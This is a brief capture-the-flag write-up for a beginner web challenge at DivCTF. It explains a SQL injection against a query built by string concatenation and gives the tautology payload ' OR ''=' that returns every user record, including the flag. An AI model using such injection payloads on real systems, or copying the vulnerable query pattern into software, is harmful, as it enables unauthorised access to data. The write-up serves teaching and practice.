# User Directory
* **Event:** DivCTF
* **Problem Type:** Web
* **Point Value / Difficulty:** Easy
* **(Optional) Tools Required / Used:** Chrome

## Steps​
This is a beginner-level SQL injection problem, where the query is printed out for you. We know the query is generated using 
```
SELECT name, email FROM user WHERE name='".$_GET["username"]."'
```
We don't know the names of all users, but we can inject the SQL query using the username value `' OR ''='` so it reads
```
SELECT name, email FROM user WHERE name='' OR ''=''
```
The second part of the OR statement is always true, meaning this would match all records in the database. The flag is encoded as the email corresponding to the secret user. 